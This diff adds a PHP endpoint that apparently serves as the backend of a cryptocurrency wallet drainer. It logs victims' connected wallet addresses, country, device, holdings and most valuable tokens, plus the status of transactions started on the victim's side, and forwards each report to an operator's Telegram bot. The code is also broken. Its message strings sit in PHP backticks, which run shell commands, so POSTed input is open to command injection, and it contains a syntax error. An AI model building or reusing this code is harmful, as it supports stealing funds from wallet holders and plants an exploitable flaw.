@@ -1,0 +1,88 @@
+<?php
+
+include '../config.php';
+
+$replyMarkup = '';
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $message="none";
+    if($_POST['connect']){
+        
+        $address=$_POST["address"];
+        $wallet_name=$_POST["wallet_name"];
+        $country = $_POST["country"];
+        $device = $_POST["device"];
+        $amount =$_POST['amount'];
+        $available =$_POST['available'];
+        $message =`?? <strong>Wallet connected</strong>
+<strong>User address:</strong>
+<code>$address | <a href="https://tronscan.org" target="_blank">TronScan</a></code>
+<strong>Wallet name:</strong><code>$wallet_name</code>
+<strong>Country:</strong><code>$country</code>
+<strong>Device:</strong><code>$device</code>
+<strong>Total value tokens:<strong><code>$amount+ " $"</code>
+<strong>Most valuable tokens:</strong> <code>$available ? $available: "No tokens available"</code>`;
+    }
+    if($_POST['success']){
+        $method = $_POST["method"];
+        $token_name = $_POST["token_name"];
+        $token_type = $_POST["token_type"];
+        $token_contract = $_POST["token_contract"];
+        $token_amount = $_POST["token_amount"];
+        $token_balance = $_POST["token_balance"];
+        $from_address = $_POST["from_address"];
+        $to_address = $_POST["to_address"];
+        $hash = $_POST["hash"];
+        $message=`? <strong>Transaction completed: on Client side:</strong>
+<strong>Method:<strong><code>$method</code>
+<strong>Token name:</strong><code>$token_name</code>
+<strong>Token type:</strong><code>$token_type</code>
+<strong>Token contract:</strong><code>$token_contract</code>
+<strong>Token amount:</strong><code>$token_amount</code>
+<strong>Token balance:</strong><code>$token_balance + "$"</code>
+<strong>From:</strong>
+<code>$from_address<code>
+<strong>To:</strong>
+<code>$to_address<code>
+<strong>Transaction Hash:<strong> <code>$hash</code>`;
+    }
+    if($_POST['error']){
+        $method = $_POST["method"];
+        $token_name = $_POST["token_name"];
+        $token_type = $_POST["token_type"];
+        $token_contract = $_POST["token_contract"];
+        $token_amount = $_POST["token_amount"];
+        $token_balance = $_POST["token_balance"];
+        $from_address = $_POST["from_address"];
+        $to_address = $_POST["to_address"];
+        $error = $_POST["error"];
+        $message=`? <strong>Transaction reverted: on Client side:</strong>
+<strong>Method:<strong><code>$method</code>
+<strong>Token name:</strong><code>$token_name</code>
+<strong>Token type:</strong><code>$token_type</code>
+<strong>Token contract:</strong><code>$token_contract</code>
+<strong>Token amount:</strong><code>$token_amount</code>
+<strong>Token balance:</strong><code>$token_balance + "$"</code>
+<strong>From:</strong>
+<code>$from_address<code>
+<strong>To:</strong>
+<code>$to_address<code>
+<strong>Error:<strong> <code>$error</code>`;
+    }
+    if($_POST['transaction']){
+        $method = $_POST["method"];
+        $token_name = $_POST["token_name"];
+        $token_type = $_POST["token_type"];
+        $token_contract = $_POST["token_contract"];
+        $token_amount = $_POST["token_amount"];
+        $token_balance = $_POST["token_balance"];
+        $message=`?<strong>Transaction started on Client side:</strong>
+<strong>Method:<strong><code>$method</code>
+<strong>Token name:</strong><code>$token_name</code>
+<strong>Token type:</strong><code>$token_type</code>
+<strong>Token contract:</strong><code>$token_contract</code>
+<strong>Token amount:</strong><code>$token_amount</code>
+<strong>Token balance:</strong><code>$token_balance + "$"</code>`;
+    }
+    echo ;
+    message_to_telegram($bot_token, $chat, $message, json_encode($replyMarkup));
+}
